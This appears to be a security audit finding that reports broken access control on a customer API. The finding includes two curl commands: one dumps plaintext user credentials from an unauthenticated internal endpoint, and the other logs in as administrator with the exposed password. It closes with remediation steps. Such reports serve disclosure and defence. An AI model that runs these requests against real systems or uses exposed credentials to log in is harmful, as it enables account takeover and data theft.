# ZV-001: Customer API Credential Exposure

Severity: Critical  
Asset: `customer-api.acme.local`  
Category: broken access control, credential disclosure

## Scenario

An unauthenticated attacker calls an internal endpoint exposed through the public Customer API. The response contains plaintext user credentials, including an administrator account. The attacker then logs in as admin and receives an admin bearer token.

## Impact

This is a direct account compromise path. It can expose customer data, administrative actions, and any downstream systems trusted by the Customer API.

## Evidence

```bash
curl --noproxy '*' -i http://customer-api.acme.local/api/internal/system/users-dump
```

Observed proof:

```text
"username": "admin"
"email": "admin@mail.com"
"password": "pass1"
"admin": true
```

Admin login:

```bash
curl --noproxy '*' -i -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"pass1"}' \
  http://customer-api.acme.local/users/v1/login
```

## Remediation

- Remove the internal dump endpoint from public routing.
- Remove plaintext password storage.
- Rotate all exposed credentials.
- Add authorization tests for every internal endpoint.
- Add a Verity retest that confirms anonymous requests receive `401` or `403`.
